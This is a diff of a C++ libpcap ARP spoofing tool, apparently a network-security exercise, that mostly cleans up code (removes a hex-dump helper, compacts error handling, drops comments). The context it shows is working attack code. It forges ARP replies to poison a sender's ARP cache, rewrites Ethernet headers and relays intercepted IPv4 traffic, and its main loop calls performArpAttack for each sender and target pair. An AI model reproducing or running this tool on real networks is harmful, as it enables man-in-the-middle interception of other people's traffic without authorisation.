@@ -7,6 +7,7 @@
 #include "ethhdr.h"
 #include "arphdr.h"
 #include "iphdr.h"
+
 #include <map>
 #include <set>
 #include <mutex>
@@ -32,39 +33,6 @@ std::atomic<bool> filter_needs_update(false);
 std::mutex filter_mutex;
 std::condition_variable filter_cv;
 
-void print_packet_contents(const u_char* packet, int length) {
-	printf("-------------PACKET!(%d)--------------------\n", length);
-	
-    for (int i = 0; i < length; i++) {
-        // 16바이트씩 한 줄에 출력
-        if (i % 16 == 0) {
-            printf("\n%04x  ", i);  // 주소 출력 (offset)
-        }
-        
-        printf("%02x ", packet[i]);  // 각 바이트를 16진수로 출력
-        
-        // 16바이트씩 끝날 때마다 추가적인 공백을 넣어 가독성을 높임
-        if (i % 16 == 15 || i == length - 1) {
-            int space = 15 - (i % 16);
-            for (int j = 0; j < space; j++) {
-                printf("   ");
-            }
-            printf(" ");
-            
-            // 해당 16바이트의 ASCII 값 출력
-            for (int j = i - (i % 16); j <= i; j++) {
-                if (packet[j] >= 32 && packet[j] <= 126) {
-                    printf("%c", packet[j]);  // 프린트 가능한 문자는 그대로 출력
-                } else {
-                    printf(".");  // 그 외에는 점(.)으로 출력
-                }
-            }
-        }
-    }
-	printf("----------------------------------------");
-    printf("\n");
-}
-
 // sender_ips의 내용을 출력하는 함수
 void print_sender_ips() {
     std::cout << "Current sender_ips contents:\n";
@@ -84,7 +52,6 @@ void print_relay_ip_match() {
     }
     std::cout << "----------------------------------\n";
 }
-void print_mac_address(const Mac& mac) { 	printf("%s\n", static_cast<std::string>(mac).c_str()); }
 
 #pragma pack(push, 1)
 struct EthArpPacket final {
@@ -101,27 +68,19 @@ void find_my_ipmac(const char* dev, Ip *my_ip, Mac* my_mac){
 	struct ifreq s;
     int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
 
-    if (fd < 0) {
-        perror("socket");
-        return;
-    }
-
+    if (fd < 0) {  perror("socket");  return; }
     strcpy(s.ifr_name, dev);
     if (0 == ioctl(fd, SIOCGIFHWADDR, &s)) {
         // MAC 주소를 sender_mac 배열에 저장
         for (int i = 0; i < 6; ++i) {
 			*my_mac = Mac(reinterpret_cast<uint8_t*>(s.ifr_addr.sa_data));
         }
-    } else {
-        perror("ioctl");
-    }
+    } else {   perror("ioctl"); }
 
 	    // IP 주소 찾기
     if (ioctl(fd, SIOCGIFADDR, &s) == 0) {
 		*my_ip = Ip(ntohl(reinterpret_cast<struct sockaddr_in*>(&s.ifr_addr)->sin_addr.s_addr));
-    } else {
-        perror("ioctl");
-    }
+    } else {  perror("ioctl"); }
 
     close(fd);
 };
@@ -131,7 +90,6 @@ void make_send_packet(EthArpPacket &packet_send, const Mac& eth_sender_mac, cons
 	packet_send.arp_.hrd_ = htons(ArpHdr::ETHER);
 	packet_send.arp_.pro_ = htons(EthHdr::Ip4);
     isrequest? packet_send.arp_.op_ = htons(ArpHdr::Request): packet_send.arp_.op_ = htons(ArpHdr::Reply);
-	//packet_send.arp_.op_ = htons(ArpHdr::Request);
 
 	packet_send.arp_.hln_ = Mac::SIZE;
 	packet_send.arp_.pln_ = Ip::SIZE;
@@ -144,15 +102,11 @@ void make_send_packet(EthArpPacket &packet_send, const Mac& eth_sender_mac, cons
 	
 	packet_send.arp_.tmac_ = arp_target_mac;
 	packet_send.arp_.tip_ = htonl(static_cast<uint32_t>(target_ip));
-
 }
 
 void change_arp_table(pcap_t* handle,const Mac& my_mac, const Mac& sender_mac, const Ip& target_ip, const Ip& sender_ip){
 
 	EthArpPacket packet_send;
-	
-	const Mac& broadcast = Mac::broadcastMac();
-    const Mac& zero = Mac::nullMac();
 	make_send_packet(packet_send, my_mac, sender_mac, my_mac, target_ip, sender_mac, sender_ip, true);
 	
 	//send PAcket!!!!
@@ -163,34 +117,24 @@ void change_arp_table(pcap_t* handle,const Mac& my_mac, const Mac& sender_mac, c
 	}
 	printf("sdf\n");
 	try {
-        // 동기화된 접근을 보장하기 위해 lock_guard를 사용합니다.
         {
-            //std::lock_guard<std::mutex> lock(relay_ip_match_mutex);
-
             printf("add to relay map\n");
             relay_ip_match[sender_ip] = target_ip;
 			sender_ips.insert(sender_ip);
+            print_relay_ip_match();
 			print_sender_ips();
             filter_needs_update = true;  // Indicate that the filter needs to be updated
             filter_cv.notify_one(); // Notify the relay thread
-            
         }
-    } catch (const std::exception& e) {
-        // 예외가 발생하면 에러 메시지를 출력합니다.
-        std::cerr << "Exception: " << e.what() << std::endl;
-    }
-	printf("add to relay map complete, unlock!\n");
-	print_relay_ip_match();
+    } catch (const std::exception& e) { std::cerr << "Exception: " << e.what() << std::endl; }	
 };
 
 Mac get_mac_address(pcap_t* handle, const Mac my_mac, const Ip my_ip, const Ip& ip) {
     Mac new_mac_addr;
-
+    //use cache
     auto it = mac_cache.find(ip);
     if (it != mac_cache.end()) {
         new_mac_addr = it->second;
-        //printf("(already in set) IP(%s) =>  ", static_cast<std::string>(ip).c_str());
-        //print_mac_address(new_mac_addr);
         return new_mac_addr;
     }
 
@@ -235,18 +179,15 @@ Mac get_mac_address(pcap_t* handle, const Mac my_mac, const Ip my_ip, const Ip& 
                 && (EAPacket->arp_.op() == ArpHdr::Reply)
                 && (EAPacket->arp_.sip() == ip)) {
                 new_mac_addr = EAPacket->arp_.smac();
-
                 printf("IP(%s) =>  ", static_cast<std::string>(ip).c_str());
-                print_mac_address(new_mac_addr);
+                printf("%s\n", static_cast<std::string>(new_mac_addr).c_str());
+                //add to mac cache
                 mac_cache[ip] = new_mac_addr;
                 return new_mac_addr;
             }
         }
-
-        // If we reach here, it means the timeout occurred, and we need to retry
         printf("Retrying to get MAC address for IP(%s), attempt %d\n", static_cast<std::string>(ip).c_str(), attempt + 1);
     }
-
     printf("Failed to retrieve MAC address for IP(%s) after %d attempts.\n", static_cast<std::string>(ip).c_str(), max_retries);
     return new_mac_addr;  // Return the (likely) empty MAC address
 }
@@ -273,13 +214,10 @@ void relay_packets(pcap_t* handle, char* dev, const Ip& my_ip, const Mac& my_mac
         std::unique_lock<std::mutex> lock(filter_mutex);
         filter_cv.wait(lock, []{ return filter_needs_update.load(); });
 
-        // Construct the filter expression
-        //std::string filter_exp = "ether dst " + std::string(my_mac) + " and (";
         std::string filter_exp = "(ether dst " + std::string(my_mac) + " and (";
         {
             std::lock_guard<std::mutex> lock(relay_ip_match_mutex);
             if (sender_ips.empty()) { //continue;
-                //filter_exp = "ether dst " + std::string(my_mac) + " and ip host 0.0.0.0";
                 filter_exp = "ether dst " + std::string(my_mac);
             } else {
                 for (auto it = sender_ips.begin(); it != sender_ips.end(); ++it) {
@@ -290,17 +228,12 @@ void relay_packets(pcap_t* handle, char* dev, const Ip& my_ip, const Mac& my_mac
                 }
             }
         }
-        // filter_exp += ")";
         filter_exp += ")) or (ether proto 0x0806)";
-        //Construct the filter expression
-        
         
         printf("filter_exp: %s", filter_exp.c_str());
-        // Compile and set the new filter
         struct bpf_program fp;
         if (pcap_compile(handle, &fp, filter_exp.c_str(), 0, PCAP_NETMASK_UNKNOWN) == -1) {
             fprintf(stderr, "pcap_compile failed: %s\n", pcap_geterr(handle));
-            
             exit(0);
             continue;
         }
@@ -326,14 +259,9 @@ void relay_packets(pcap_t* handle, char* dev, const Ip& my_ip, const Mac& my_mac
             EthHdr* eth_hdr = (EthHdr*)packet;
 
             if (eth_hdr->type() == EthHdr::Arp) {
-                // Handle ARP packet
                 ArpHdr* arp_hdr = (ArpHdr*)(packet + sizeof(EthHdr));
                 Ip src_ip = arp_hdr->sip();
                 Ip dst_ip = arp_hdr->tip();
-                // printf("---------------------RELAY START-------------------\n");
-                // printf("Received ARP packet from %s to %s\n", 
-                //        std::string(src_ip).c_str(), 
-                //        std::string(dst_ip).c_str());
 
                 if (relay_ip_match.find(src_ip) != relay_ip_match.end()
                 && dst_ip== relay_ip_match[src_ip]) {
@@ -351,41 +279,22 @@ void relay_packets(pcap_t* handle, char* dev, const Ip& my_ip, const Mac& my_mac
                     if (res != 0) { fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle)); }
                     printf("Attack finished\n");
                     printf("---------------------------------------------------\n");
-
-                    
                 }
-
-                
             }else if (eth_hdr->type() == EthHdr::Ip4){
 
             IpHdr* ip_hdr = (IpHdr*)(packet + sizeof(EthHdr));
-
             Ip src_ip = ip_hdr->sip();
             Ip dst_ip = ip_hdr->dip();
-            // printf("---------------------RELAY START-------------------\n");
-
-            // printf("Captured IPv4 packet from %s to %s\n",
-            //        std::string(src_ip).c_str(),
-            //        std::string(dst_ip).c_str());
 
             Mac new_dmac = get_mac_address(handle, my_mac, my_ip, relay_ip_match[src_ip]);
-                       // Check if src_ip has a corresponding relay MAC
             {
                 std::lock_guard<std::mutex> lock(relay_ip_match_mutex);
                 if (relay_ip_match.find(src_ip) != relay_ip_match.end()
                 && dst_ip== relay_ip_match[src_ip]) {
                     
-                    // Modify MAC addresses
                     eth_hdr->smac_ = my_mac;
-                    
                     eth_hdr->dmac_ =new_dmac;
-                    // eth_hdr->dmac_ =fixed_dmac;
 
-                    // Recalculate checksums if necessary (usually needed for IP, TCP, UDP headers)
-                    // Example (pseudo code, actual recalculation depends on your environment):
-                    // ip_hdr->checksum = recalculate_ip_checksum(ip_hdr);
-
-                    // Resend the packet
                     if (pcap_sendpacket(handle, packet, header->caplen) != 0) {
                         fprintf(stderr, "Error resending packet: %s\n", pcap_geterr(handle));
                     } else {
@@ -418,12 +327,12 @@ int main(int argc, char* argv[]) {
 	Ip my_ip, sender_ip, target_ip;
 	Mac my_mac, sender_mac, target_mac;
 
-	//find_my_mac(dev, my_mac);
 	printf("==============Basic Information================\n");
 	find_my_ipmac(dev, &my_ip, &my_mac);
 	printf("My IP Address: %s\n",  static_cast<std::string>(my_ip).c_str());
 	printf("My Mac Address: ");
-	print_mac_address(my_mac);
+    printf("%s\n", static_cast<std::string>(my_mac).c_str()); 
+    
 	
 	char errbuf[PCAP_ERRBUF_SIZE];
 	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
@@ -439,19 +348,12 @@ int main(int argc, char* argv[]) {
 		return -1;
 	}
 
-	//char buffer[INET_ADDRSTRLEN];
-	// std::thread relayThread(relay_packets, dev, handle2, my_ip, my_mac);
 	 std::thread relayThread(relay_packets, handle2, dev, std::ref(my_ip), std::ref(my_mac));
 	for (int i=2; i<argc; i+=2){
-		//std::thread relayThread(relay_ip_packet, handle, my_mac);
-
-		 sender_ip = Ip(argv[i]);
-		 target_ip = Ip(argv[i+1]);
-		
+		sender_ip = Ip(argv[i]);
+		target_ip = Ip(argv[i+1]);
 		performArpAttack(handle, dev, my_ip, my_mac, sender_ip, target_ip);
-		
 	}
-	//relay_packets(handle, my_mac);
 	relayThread.join();
 	pcap_close(handle);
     pcap_close(handle2);
